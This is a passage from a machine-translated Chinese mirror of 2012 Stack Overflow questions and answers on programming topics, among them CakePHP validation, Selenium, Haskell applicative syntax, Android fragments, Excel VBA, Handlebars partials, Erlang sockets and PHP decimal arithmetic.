        'message' => 'foo',
        'required' => true,
    ),
);

public function confirmValidPercentage($data) {
    $percentage = floatval($data['percentage']);

    $total = 0.00;
    $weights = $this->find('all', array('recursive'=>-1));
    foreach ($weights as $weight) {
        $total += floatval($weight[$this->name]['percentage']);
    }

    if ($total + $percentage > 100) {
        // handle the error variable here
        return false;
    }
    else {
        return true;
    }
} 
```

我试过了 ：

```
$this->validate['percentage']['message'] = 'You have '.(100-$total).'% remaining'; 
```

但此处设置的消息元素不会覆盖原始消息 - 错误消息仍然是“foo”。我尝试完全从 $validation 数组中删除消息元素，但它默认为父名称，即“百分比”。我试过：

```
unset($this->validate['percentage']['message']); 
```

在设置验证消息之前，但结果是一样的。

有谁知道如何在验证错误消息中返回变量？非常感谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-18T00:08:34.393

这实际上很容易。只返回错误字符串！

```
return 'You have ' . ...; 
```

# python - python selenium webdriver和只是硒之间的区别？

> ID：12014519
> 
> 赞同：2
> 
> 时间：2012-08-17T23:48:55.643
> 
> 标签：python, selenium

像这样的东西有什么区别：

```
from selenium import webdriver

browser = webdriver.Firefox()
browser.get('http://www.ubuntu.com/') 
```

和这个：

```
from selenium import selenium

selenium = selenium("localhost", 4444, "firefox", "http://www.locationary.com/")
selenium.start()

sel = selenium
sel.open("/")
sel.type("inUserName", "email")
sel.type("inUserPass", "password")
sel.click("login@DEFAULT") 
```

？？？

谢谢。

编辑：

我应该使用哪一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T20:37:34.997

> 我应该使用哪一个？

这取决于你的目标。如果您需要自动化一些测试用例，可以同时使用它们。但是如果你要开始一些大的过程，例如在你的公司测试自动化，我建议你使用 Webdriver。它会给你更多的便携性，它更现代。顺便说一句，我不确定 Selenium RC 是否会进一步开发。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:56:02.767

Selenium Webdriver 是 Selenium 的较新版本（旧版本称为 Selenium RC）。它不需要外部服务器，并且比 Selenium RC 具有更好的 Web 对象支持。

如果您有选择，请使用 Webdriver。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-17T23:52:50.097

Webdriver 是一个独立的 api，不需要 SeleniumRC 所做的服务器组件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T06:33:44.810

如果使用`webdriver`，则无需在运行代码之前启动 selenium rc 服务器。它直接与浏览器对象交互。

如果您需要更多说明，请通过此[链接](http://seleniumhq.org/docs/03_webdriver.html)。

# haskell - 是否可以为应用函子使用括号语法糖？

> ID：12014524
> 
> 赞同：20
> 
> 时间：2012-08-17T23:50:05.930
> 
> 标签：haskell, syntactic-sugar, template-haskell, applicative

在[McBride 和 Paterson 的“带效果的应用程序编程”中，](http://strictlypositive.org/IdiomLite.pdf)他们引入了一些可爱的语法糖来提升纯函数：

```
[| f x y z |] 
```

为了

```
f <$> x <*> y <*> z 
```

我记得有人在其他地方使用`li f w x y z il`or `il f v w x y z li`，我认为/希望这可能是因为它可以使用一些现有的语言特性和 and 的巧妙定义来`li`定义`il`。

除了论文之外，我找不到任何对此的参考，并且假设`[|`并且`|]`不太可能很快出现在 ghc 中，是否有可能以`li`某种方式实施`il`？我想不出适合他们的类型，所以我假设我需要 Template Haskell 或类似的东西，但我知道的还不够多。`[af| f x y ]`会很好，但在我开始尝试之前我不知道这是否可能，如果是的话，当然需要帮助。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-18T06:53:50.193

I think [this](http://www.haskell.org/haskellwiki/Idiom_brackets) is what you are looking for. If I remember correctly there has also been a discussion on the haskell-cafe mailing list regarding this style of applicative applications.

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-08-18T06:59:49.213

这很容易在 Template Haskell 中实现，方法是使用[haskell-src-meta](http://hackage.haskell.org/package/haskell-src-meta-0.5.1.2)包来解析准引用中的 Haskell 表达式。

```
{-# LANGUAGE TemplateHaskell #-}

import Language.Haskell.TH
import Language.Haskell.TH.Quote
import Language.Haskell.Meta (parseExp)

import Control.Applicative ((<*>), (<$>))

af = QuasiQuoter
    { quoteExp  = parseAf
    , quotePat  = undefined
    , quoteType = undefined
    , quoteDec  = undefined
    }

parseAf :: String -> Q Exp
parseAf s = case parseExp s of
    Right ex -> applyExp ex
    Left err -> fail err

applyExp :: Exp -> Q Exp
applyExp (AppE f@(AppE _ _) a) = [|$(applyExp f) <*> $(return a)|]
applyExp (AppE f a) = [|$(return f) <$> $(return a)|]
applyExp _ = fail "invalid expression in af" 
```

请注意，由于 Template Haskell 的工作原理，您不能从定义它的同一文件中使用准引用器，因此请将上述内容保存到其自己的模块中。

在 GHCi 中测试

```
*Main> :set -XTemplateHaskell
*Main> :set -XQuasiQuotes
*Main> [af|(+) (Just 3) (Just 8)|]
Just 11
*Main> [af|(+) (Just 6) Nothing|]
Nothing 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-23T17:07:25.747

对此的 Template Haskell 方法是由 Matt Morrow 编写的，然后由我在[applicative-quoters 包](http://hackage.haskell.org/package/applicative-quoters)中维护。您将其用作`[i| f x y z |]`，因此它与 McBride 和 Paterson 的原始想法相当接近。

（可能的缺点：名称`i`不应该被您的代码所掩盖，否则它将不起作用。个人不确定这有多大意义）。

# c# - 从泛型方法中获取类型的属性

> ID：12014525
> 
> 赞同：1
> 
> 时间：2012-08-17T23:50:19.253
> 
> 标签：c#, generics, methods

在业余时间，我正在创建一个小型业务框架，可以将其重用于我的学校项目。我想这将类似于一个愚蠢的 CSLA，如果这可以给你一个想法。

不过，我在业务规则类方面遇到了一些麻烦。这是它现在的样子：

```
public class Rule
{
    public string PropertyName { get; }
    public string Description { get; }
    public Func<object, bool> ValidationRule { get; }

    public Rule(string propertyName, string message, Func<object, bool> validationRule)
    {
        this.PropertyName = propertyName;
        this.Description = description;
        this.ValidationRule = validationRule;
    }

    public bool IsBroken(object value)
    {
        return ValidationRule(value);
    }
} 
```

当我检查规则是否被破坏（值可以是任何类型）时，我不是我正在做的装箱和拆箱的忠实粉丝。

当然，我可以使整个类通用，并让我的 IsBroken 函数采用 T 类型的对象（无论如何可能比使用对象更好），但我想知道是否可以做类似以下的事情：

```
public class Rule
{
    public Func<T, bool> ValidationRule { get; }
    public bool IsBroken<T>(T value)
    {
        return ValidationRule(value);
    }
} 
```

没有用泛型类型声明类？

欢迎任何其他提示。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T23:54:21.220

> 我想知道是否可以做类似于以下的事情：
> [...]
> 不用用泛型类型声明类？

不，这是不可能的。编译器和/或运行时如何知道属性声明的 T 类型是什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:01:23.960

将 Rule 类声明为泛型是唯一的方法，而且它对您来说很有趣，因为您需要对 T 泛型设置约束

```
 public class Rule<T>
    {
        public Func<T, bool> ValidationRule { get; }
        public bool IsBroken<T>(T value)
        {
            return ValidationRule(value);
        }
    } 
```

# android - 从静态片段类调用主类中的方法

> ID：12014526
> 
> 赞同：4
> 
> 时间：2012-08-17T23:50:21.493
> 
> 标签：android, class, methods, static, fragment

我有一个片段类，我想在我的活动的“主”类中调用一个方法。片段类是静态的，所以这可能是导致问题的原因，尽管我必须保持它是静态的。我希望能够在我的静态类中做这样的事情： `Method();` 我试过了： `getActivity().Method();` 虽然那没有用。我应该怎么办？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-18T00:40:05.333

您应该能够将活动返回给您的特定类以访问公共方法。

如果您的主类称为**MainActivity**并且您有一些公共方法**Method**那么您可以从片段方法中执行以下操作：

```
((MainActivity) getActivity()).Method(); 
```

或者，您可以使用片段文档中描述的[事件回调模式。](http://developer.android.com/guide/components/fragments.html#EventCallbacks)

# vba - 如何使用 Excel VBA 在 2 列中筛选 1 个条件？

> ID：12014529
> 
> 赞同：1
> 
> 时间：2012-08-17T23:50:43.933
> 
> 标签：vba, excel

我在 A 列和 B 列中有 2 列孩子的姓名。它们代表一起工作的成对的孩子。

我想过滤“鲍勃”与任何其他孩子一起工作的所有行。因此，我想过滤在 A 列或 B 列中显示 1 个条件（Bob）的所有行。

我想将这些行或成对的孩子放入一个数组中。我该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T06:54:49.540

I haven't seen Doug's answer on Union of Ranges. But here is an example. This uses `Autofilter` instead of looping through ranges. I have commented the code so you should not have problem understanding it.

**CODE**

```
Sub Sample()
    Dim ws As Worksheet
    Dim rng As Range, rngA As Range, rngB As Range
    Dim Lrow As Long

    Set ws = Sheets("Sheet1")

    With ws
        '~~> Get last row of Col A
        Lrow = .Range("A" & .Rows.Count).End(xlUp).Row

        '~~> Identify the range
        Set rng = .Range("A1:B" & Lrow)

        .AutoFilterMode = False

        '~~> Identify the range in Col A Which has BOB
        With rng
            .AutoFilter Field:=1, Criteria1:="Bob"
            Set rngA = .Offset(1, 0).SpecialCells(xlCellTypeVisible)
        End With

        .AutoFilterMode = False

        '~~> Identify the range in Col B Which has BOB
        With rng
            .AutoFilter Field:=2, Criteria1:="Bob"
            Set rngB = .Offset(1, 0).SpecialCells(xlCellTypeVisible)
        End With

        .AutoFilterMode = False

        '~~> Hide All except the Header row
        rng.Offset(1, 0).EntireRow.Hidden = True
        '~~> Unhide the rows which have Bob
        Union(rngA, rngB).EntireRow.Hidden = False
    End With
End Sub 
```

**SCREENSHOT**

![enter image description here](../Images/b8b2c5570b783a618092794cec0d0a88.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T02:21:57.583

试试下面的代码。它创建一个便签本表，复制任一列中包含 Bob 的任何行，从结果中创建一个数组，然后删除便签本。

```
Sub GetBobRows()
    Dim src As Worksheet
    Dim tgt As Worksheet
    Dim rng As Range
    Dim cell As Range
    Dim lastRow As Long
    Dim bobCount As Long
    Dim bobRow As Long

    Set src = ActiveSheet
    Sheets.Add
    ActiveSheet.Name = "Scratchpad"
    Set tgt = ActiveSheet

    ' assumes two columns with Bob data are A and B and start in row 1
    ' of the activesheet
    lastRow = src.Range("A" & src.Rows.Count).End(xlUp).Row

    Set rng = src.Range("A1:A" & lastRow)
    bobCount = 1

    For Each cell In rng
        If cell.Value = "Bob" Or cell.Offset(, 1).Value = "Bob" Then
            bobRow = cell.Row
            tgt.Range("A" & bobCount & ":B" & bobCount).Value = _
                src.Range("A" & bobRow & ":B" & bobRow).Value
            bobCount = bobCount + 1
        End If
    Next
    Call CreateBobArray(tgt)
    DeleteScratchpad
End Sub

Sub CreateBobArray(tgt As Worksheet)
    Dim vaBobs As Variant
    Dim lRow As Long

    lRow = tgt.Range("A" & tgt.Rows.Count).End(xlUp).Row

    'Read the data from the scratch pad into the bob array
    vaBobs = tgt.Range("A1:B" & lRow).Value
End Sub

Sub DeleteScratchpad()
    Application.DisplayAlerts = False
        Sheets("Scratchpad").Delete
    Application.DisplayAlerts = True
End Sub 
```

# matlab - 连续时间马尔可夫过程

> ID：12014531
> 
> 赞同：2
> 
> 时间：2012-08-17T23:51:03.640
> 
> 标签：matlab, time, differential-equations, markov

求解 CT 马尔可夫过程的方法有哪些？

我知道对于诸如生死或某些队列之类的已知过程，可以分析解决问题吗？但是，如果无法解析可解，如何解决？

看来应该使用数值方法。但是，我还没有找到任何支持它的工具。MATLAB有ode方法，但是除了设置过程的（常微分方程）ode外，还要添加一个matlab不支持的线性方程？

如何解决这些问题？
有什么工具或其他方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T19:59:39.180

## 一般参考

您可能想看一下物理科学家用于连续时间马尔可夫过程的标准参考。NG van Kampen 的[物理和化学随机过程](https://rads.stackoverflow.com/amzn/click/com/0444529659)是一种全面且易读的处理方法。Gardiner's [Stochastic Methods: A Handbook for the Natural and Social Sciences](https://rads.stackoverflow.com/amzn/click/com/3642089623)是另一个常用的参考资料。这两种方法都提供了求解随机过程的解析解和微扰方法。

## 离散状态

如果您的状态是离散的（或者您可以离散地近似它们），那么您可以使用蒙特卡洛采样方法来构建轨迹集合。对此更好的参考资料之一是 Barkema 和 Newman[在统计物理学中的蒙特卡洛方法](https://rads.stackoverflow.com/amzn/click/com/0198517971)，其中有自旋系统的很好的例子，并提出了几种算法。[您还可以在有关Gillespie 算法](http://en.wikipedia.org/wiki/Gillespie_algorithm)和[动力学蒙特卡罗](http://en.wikipedia.org/wiki/Kinetic_Monte_Carlo)的文献中找到相当多的可读材料。

## 连续状态

如果您的过程被表述为 Langevin 方程，或者包含类似的嵌入式 Wiener 过程，那么您可能需要查看积分随机微分方程 (SDE) 的技术。一篇相当近期的论文，其中包含一些很好的参考文献[Algorithms for Brownian dynamics computer simulations: Multivariable case](http://pre.aps.org/abstract/PRE/v60/i2/p2381_1) by Brańka 和 Heyes。

如果您的 CT 马尔可夫过程可以表述为[Fokker-Planck 方程](http://en.wikipedia.org/wiki/Fokker%E2%80%93Planck_equation)，那么 Risken 的[The Fokker-Planck Equation: Methods of Solutions and Applications](https://rads.stackoverflow.com/amzn/click/com/354061530X)是寻找解析解的绝佳场所。Fokker-Planck 方程与扩散-对流方程非常相似，同样适用于数值 PDE 技术。

## 执行

这些算法中的大多数都相当容易实现。直接蒙特卡罗方法编写起来非常简单。连续时间蒙特卡洛只是稍微复杂一点。积分 SDE 与编写 Runge-Kutte 或 Verlet 积分器一样复杂，并且通常比对 Fokker-Planck 方程进行数值积分更容易，但并非总是如此。

# hyperlink - 如何使链接的宽度与 水平

> ID：12014537
> 
> 赞同：0
> 
> 时间：2012-08-17T23:52:03.583
> 
> 标签：hyperlink, navbar

我的页面顶部有一个导航栏，链接是水平布局的。每当我尝试使链接成为整个 li 的大小时，它最终都会将所有链接放在彼此之上。我试图将 a 标签设置为 display:block; 宽度为 100%，但它搞砸了。这是我的代码，有人可以帮助我吗？

```
 <div class="container">
        <ul id="top">   
            <li class="nav"><a href="#">Home</a></li>
            <li class="nav"><a href="#">Forum</a></li>
            <li class="nav"><a href="#">Play Now</a></li>
            <li class="nav"><a href="#">Download</a></li>
            <li class="nav"><a href="#">Hiscores</a></li>
            <li class="nav"><a href="#">Shop</a></li>
            <li class="nav"><a href="#">Vote</a></li>
        </ul>
    </div>

    .container {width:100%;}
    #top {list-style:none;padding:5px;background:#E8E1A5;}
    #top a {text-decoration:none;color:#1D486F;margin:0px;width:100%;}
    #top .nav {display:inline;border-right:1px solid black;width:100px;padding:5px 20px;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-02T23:40:38.837

我遇到了同样的问题，当我尝试在 nag 中放置 6 个链接时，下降到 5 个链接并且它的格式很好。不知道这是否是一个选项，但尝试一下......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:58:02.113

见[http://jsfiddle.net/wYEJY/](http://jsfiddle.net/wYEJY/)

您可以尝试改为设置`width:100px`为`#top a`. 但是锚点是内联元素，所以你必须设置`display:inline-block`. 然后，设置`display:inline-block`为`#top .nav`太以最小化其宽度并使其水平。

所以添加以下代码：

```
#top a {width:100px;display:inline-block;}
#top .nav {display:inline-block;} 
```

你也可以使用

```
#top a {display:block;}
#top .nav {display:inline-block;width:100px;} 
```

但这在 IE 7 上不起作用，因为如果您设置`display:inline-block`为块元素，它将被呈现为一个`block`元素。

另一种选择：浮动元素

```
#top{overflow:hidden;}
#top a {width:100px;display:block;}
#top .nav{float:left} 
```

你可以在这里看到所有的可能性：http: [//jsfiddle.net/wYEJY/1/](http://jsfiddle.net/wYEJY/1/)

但是请记住，如果你有一个内联元素，你就不能给它添加一个`width`属性；你应该把它改成`inline-block`.

如果你决定使用浮动元素，记得添加

```
<div style="clear:both"></div> 
```

在它们之后，或将`overflow:hidden`（或不同于`visible`）设置为包含浮动元素的包装器。

# erlang - erlang gen_tcp:recv 块

> ID：12014543
> 
> 赞同：1
> 
> 时间：2012-08-17T23:52:57.820
> 
> 标签：erlang, recv, gen-tcp

你好我有这种情况：

```
gen_tcp:connect(Address, Port, [{buffer, 1024},{active, false},{packet,0},{send_timeout, infinity}]). 
```

我使用`gen_tcp:recv(Sock,0)`，但是来自服务器的消息没有特定的结束模式，所以有什么方法可以防止客户端阻塞 recv？

来自文档：

```
do_recv(Sock, Bs) ->
    case gen_tcp:recv(Sock, 0) of
        {ok, B} ->
            do_recv(Sock, [Bs, B]);
        {error, closed} ->
            {ok, list_to_binary(Bs)}
    end. 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T10:32:26.600

首先：拥有一个阻止您知道消息已结束的协议并不是一个好主意。因此，如果您可以控制协议，那么在您的协议消息前面加上一个消息长度是一个好主意。

这就是说，通常最好不要阻止接收。

我想您希望在等待更多可能稍后到达的数据同时处理来自其他进程的消息时防止阻塞。

解决方案是使用 socket 选项`{active, once}`：

[在此处查看 Erlang 套接字选项的描述](http://www.erlang.org/doc/man/inet.html#setopts-2)：

> 如果值为 once ( `{active, once}`)，则来自套接字的一条数据消息将被发送到进程。要接收更多消息，`setopts/2`必须使用该`{active, once}`选项再次调用。

您可能很想使用`{active, true}`并获取每个数据的消息。这样做的问题是您没有流量控制，因此如果您被数据淹没，VM 会立即读取所有内容并填充到您的消息邮箱中。这很快就会失控，因为不断增长的邮箱会减慢你的速度，并且可能会吃掉你所有的记忆。

使用`{active, once}`可避免此消息泛滥。

也可以在[Learn You Some Erlang: More Control With Inet中找到对此的一个很好的描述](http://learnyousomeerlang.com/buckets-of-sockets#more-control-with-inet)

# node.js - 如何为 handlebars.js 预编译部分？

> ID：12014547
> 
> 赞同：31
> 
> 时间：2012-08-17T23:53:25.517
> 
> 标签：node.js, handlebars.js

我正在使用handlebars.js，我想开始预编译所有内容，但我似乎找不到预编译部分的方法。我的大部分模板实际上都是部分模板。我尝试将它们视为常规模板，但随后将它们称为部分模板是行不通的。

有没有办法预编译部分，或者，从另一个模板中调用一个模板？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-08-27T19:48:08.143

我找到了一个更好的方法：将所有部分预编译为模板，然后在代码中使用它们之前，添加以下行：

```
Handlebars.partials = Handlebars.templates; 
```

改进是 1) 它更短 2) 它不会丢失您在调用父模板时可能传入的任何自定义助手。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-23T16:55:52.323

[正如GitHub 上](https://github.com/wycats/handlebars.js/pull/374)提到的，Handlebars CLI 中添加了一个`-p`标志。

所以你可以使用`handlebars my_partial.handlebars -p -f output.js`

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-18T01:06:23.557

仍然不确定预编译部分，但这是如何在这个问题的帮助下从另一个模板中调用一个模板：[Handlebars helper for template composition](https://stackoverflow.com/questions/10537724/handlebars-helper-for-template-composition)

```
// instead of {{> partialName}} use {{partial "templateName"}}
Handlebars.registerHelper('partial', function(templateName,context){
    return new Handlebars.SafeString(Handlebars.templates[templateName](this));
}); 
```

[http://jsfiddle.net/EBt8R/](http://jsfiddle.net/EBt8R/)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-06-02T07:24:25.747

我正在使用 HandleBars v3.0.3，并且在一个文件中预编译了部分模板和非部分模板。

这个线程有点混乱，所以我总结了工作解决方案。

*   预编译时不要使用 -p 运算符。
*   不要通过 Handlebars.registerPartial('myPartial', '{{name}}'); 注册部分模板；
*   通过 Handlebars.partials = Handlebars.templates 使用 Nathan 将部分对象映射到模板对象的建议；
*   按名称 {{> name}} 引用部分模板

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-02-11T23:31:05.377

我设法通过将所有部分预编译为模板然后调整 Nathans 解决方案来使其工作

```
// instead of {{> partialName}} use {{partial "templateName"}}
Handlebars.registerHelper('partial', function (templateName) {
    return new Handlebars.SafeString(JST[templateName](this));
}); 
```

所以对我来说，`Handlebars.templates`当`JST`我编译东西时，我在编译的模板文件中注意到了它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-04-11T13:43:26.463

```
for(let [name, template] of Object.entries(handlebars.partials)) {
    handlebars.partials[name] = handlebars.compile(template);
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-10-01T03:12:00.350

我建议不要替换所有已注册的部分，而是显式添加部分，可能还会过滤它们，例如：

```
Object.entries(Handlebars.templates).forEach(([k, v]) => { if ( k.indexOf('partial') != -1 ) Handlebars.partials[k] = v }) 
```

在这种情况下，我们只插入名称中包含“部分”的预编译模板。这将允许您将它们存储在`partials/`子文件夹中或名称中，例如`some-partial.hbs`

# java - 删除不可打印的字符

> ID：12014550
> 
> 赞同：0
> 
> 时间：2012-08-17T23:53:53.947
> 
> 标签：java

我在数据库中有一个包含不可打印字符的列；

```
String xyz = "Company Name\r\n Magna"; 
```

从数据库中检索后，在 java 中，值如下所示

```
String companyname = "Company Name\\r\\n Magna";" 
```

它添加了一个额外的转义字符。我现在如何删除不可打印的字符？

```
companyname.replaceAll("\\p{Cntrl}", ""); // Doesn't work. 
```

即使我使用`StringBuffer`，由于额外的转义字符，它也不起作用。

请指教。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:00:01.387

在将数据放入数据库之前对数据进行编码的方式似乎给自己造成了问题。

在第一种情况下，a`replaceAll`替换字符序列`'\' 'r'`并且`'\' 'n'`是必需的；例如

```
text = text.replaceAll("\\\\r|\\\\n", ""); 
```

请注意，为了匹配文字反斜杠字符，它们必须被转义**两次**。一次是字符串文字，第二次是因为反斜杠是正则表达式中的元字符。

但是，IMO，一个更好的解决方法是不在您的数据库中以这种方式编码 CR 和 NL 字符。你不能只在数据库中表示它们而不转义吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:05:26.483

好的旧替换怎么样：

```
String text = readfromDatabase();
text = text.replace("\n", "").replace("\r", ""); 
```

或者

```
text = text.replaceAll("\\r|\\n", ""); 
```

或者

```
text = text.replaceAll("\\r", "").replaceAll("\\n", ""); 
```

# javascript - 在安装后第一次运行应用程序时从 uiwebview 发出 jquery ajax 请求

> ID：12014553
> 
> 赞同：0
> 
> 时间：2012-08-17T23:54:04.330
> 
> 标签：javascript, jquery, ios, ajax, uiwebview

我们有一个 uiWebview，它使用 jquery 发出 ajax 请求以登录。它在移动 safari 和所有浏览器中都能完美运行。

安装后第一次运行应用程序时，ajax 请求似乎消失了，但没有收到任何响应，也没有触发 ajax 请求的失败或完成事件。

我们使用了这里找到的方法：[UIWebViewDelegate not monitoring XMLHttpRequest?](https://stackoverflow.com/questions/5353278/uiwebviewdelegate-not-monitoring-xmlhttprequest)

监视请求以查看它们是否实际被发送并且它们似乎已发出但未收到任何响应。

如果我们然后退出应用程序，终止正在运行的进程，然后重新启动它，一切都会正常运行。什么可能阻止它在第一次运行时工作？

```
function makeLoginRequest(){    
//alert('about to make login request');

var loginInfo='{"username":"'+$("#tbUserName").val()+'","password":"'+$("#tbPassword").val()+'"}';      
jQuery.ajaxSetup({ 'beforeSend': function(xhr) {xhr.setRequestHeader("Accept", "text/javascript,application/javascript,text/html,application/json")} });

var loginRequest=$.ajax({
      type:'POST',
      url: 'http://ourURL.com/api/user/login.json',
      data: loginInfo,
      contentType: 'application/json', 
      dataType: 'json',
      success: function(data){
          var sessionID = data["sessid"];
          var session_name= data["session_name"];
          var userID=data.user["uid"];  
          redirectString ='ProfileView.htm?uid='+userID+'&sessionID='+sessionID+'&session_name='+session_name;
          saveUsername();
          $('window').attr('location', redirectString).delay(1000);
          if(enableConsoleLogging)console.log("login attempt succeded.");
          logDeviceData();
          setTimeout(function (){window.location=redirectString;},0);
      }
});     
loginRequest.done(function (data) {
        if(enableConsoleLogging){
            //alert('login attempt complete.');
            console.log("login attempt complete.");
            console.log(data);
        }
});
loginRequest.fail(function(data) {
    if(enableConsoleLogging){
        //alert("login attempt failed.");
        console.log("login attempt failed.");
        console.log("statusText: "+data.statusText);
        console.log("responseText: "+data.responseText);
    }
    loginFailed(data);          
}); 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:53:26.597

我们在网站后端使用 Drupal 和 Varnish。Varnish 积极地缓存东西并且不响应未缓存的请求。重新启动清漆解决了这个问题。

# android - 如何在图库中添加按钮

> ID：12014555
> 
> 赞同：0
> 
> 时间：2012-08-17T23:54:17.337
> 
> 标签：android, android-layout, android-intent

我的应用程序包含画廊中的一些图片。我想添加一个按钮，该按钮会随各自选定的图像而变化。我处于早期阶段。如何在我的项目中添加此代码。

代码如下：

```
import android.app.Activity;
import android.content.Context;
import android.content.res.TypedArray;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.BaseAdapter;
import android.widget.Gallery;
import android.widget.ImageView;
import android.widget.Toast;
import android.widget.AdapterView.OnItemClickListener;

public class GalleryView extends Activity {
Integer[] pics = {
    R.drawable.antartica1,
    R.drawable.antartica2,
    R.drawable.antartica3,
    R.drawable.antartica4,
    R.drawable.antartica5,
    R.drawable.antartica6,
    R.drawable.antartica7,
    R.drawable.antartica8,
    R.drawable.antartica9,
    R.drawable.antartica10
   };
  ImageView imageView;

  /** Called when the activity is first created. */
  @Override
  public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);

Gallery ga = (Gallery)findViewById(R.id.Gallery01);
ga.setAdapter(new ImageAdapter(this));

imageView = (ImageView)findViewById(R.id.ImageView01);
ga.setOnItemClickListener(new OnItemClickListener() {

    public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
            long arg3) {
        Toast.makeText(getBaseContext(), 
                "You have selected picture " + (arg2+1) + " of Antartica", 
                Toast.LENGTH_SHORT).show();
        imageView.setImageResource(pics[arg2]);

    }

});

}

public class ImageAdapter extends BaseAdapter {

private Context ctx;
int imageBackground;

public ImageAdapter(Context c) {
    ctx = c;
    TypedArray ta = obtainStyledAttributes(R.styleable.Gallery1);
    imageBackground = ta.getResourceId(R.styleable.Gallery1_android_galleryItemBackground, 1);
    ta.recycle();
}

public int getCount() {

    return pics.length;
}

public Object getItem(int arg0) {

    return arg0;
}

public long getItemId(int arg0) {

    return arg0;
}

public View getView(int arg0, View arg1, ViewGroup arg2) {
    ImageView iv = new ImageView(ctx);
    iv.setImageResource(pics[arg0]);
    iv.setScaleType(ImageView.ScaleType.FIT_XY);
    iv.setLayoutParams(new Gallery.LayoutParams(150,120));
    iv.setBackgroundResource(imageBackground);
    return iv;
}

}
} 
```

xml:

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:orientation="vertical"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 >

<Gallery 
android:id="@+id/Gallery01" 
android:layout_width="fill_parent" 
android:layout_height="wrap_content"></Gallery>
<ImageView 
android:id="@+id/ImageView01" 
android:layout_width="wrap_content" 
android:layout_height="wrap_content"></ImageView>

 </LinearLayout> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:20:47.190

我不确定我是否理解你，但如果你想在`ImageView`选择画廊项目时设置图片，你应该`setOnItemSelectedListener`像这样使用

```
 ga.setOnItemSelectedListener(new OnItemSelectedListener() {

        @Override
        public void onItemSelected(AdapterView<?> arg0, View arg1,
                int position, long arg3) {
            imageView01.setImageBitmap(pics[position});
        }

        @Override
        public void onNothingSelected(AdapterView<?> arg0) {}
    }); 
```

# mysql - 带有包含多个条件的where子句的mysql查询导致程序执行期间出现异常

> ID：12014557
> 
> 赞同：1
> 
> 时间：2012-08-17T23:54:23.937
> 
> 标签：mysql, where, clause

以下来自 java 的查询导致异常，指出未找到 virtual_interfaces.instance_uuid 列。

查询字符串为：

```
select instances.id, 
       instances.deleted, 
       instances.project_id, 
       instances.hostname, 
       instances.vm_state, 
       instances.updated_at, 
       instances.uuid, 
       instances.task_state, 
       virtual_interfaces.id, 
       virtual_interfaces.network_id, 
       virtual_interfaces.address, 
       virtual_interfaces.instance_uuid, 
       networks.id, 
       networks.bridge, 
       networks.cidr, 
       networks.vlan, 
       fixed_ips.address, 
       fixed_ips.network_id, 
       fixed_ips.instance_uuid 

from   instances, 
       virtual_interfaces, 
       networks, 
       fixed_ips 

where  instances.uuid=fixed_ips.instance_uuid and
       virtual_interfaces.network_id=networks.id and
       fixed_ips.instance_uuid=virtual_interfaces.instance_uuid; 
```

如果从 mysql cli 执行相同的查询字符串。

很感谢任何形式的帮助。

# php - PHP中MySQL DECIMAL数据类型的数学运算

> ID：12014559
> 
> 赞同：1
> 
> 时间：2012-08-17T23:55:06.407
> 
> 标签：php, mysql, math, decimal, sqldatatypes

我在 MySQL 表上存储货币值，并且使用 DECIMAL 作为数据类型。我需要抓取这些元素，对这些值进行一些基本的数学运算（加法、减法、求和等），将结果显示给用户，并将它们放在单独的表格中。我知道 MySQL 允许您在表中进行加法和求和，但是有没有办法将其作为 PHP 变量来执行？我知道在 PHP 中您可以使用 intval() 将字符串数字转换为整数，但这会在转换中丢失十进制值。类似的东西对我有用，因为我总是可以将它转换回字符串并将其输入到不同的 MySQL 表中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:07:39.537

PHP 有[(int)](http://php.net/int)用于整数和[(float)](http://php.net/float)用于您的问题。

PHP 可以在不定义类型且没有任何问题的情况下进行数学运算（ `+`, `-`, `*`, `/`, ）`%`

```
$var1 = 1.56;
$var2 = 0.34;
$sum = $var1+$var2; // 1.90 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:04:33.460

从 MySQL 中获取变量，然后您可以按照此手册页执行简单的算术运算：http: [//php.net/manual/en/language.types.float.php](http://php.net/manual/en/language.types.float.php)

例如

```
$a = '0.002';
$b = '1.1';

echo $c = $a + $b; // Outputs 1.1002 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T00:06:56.953

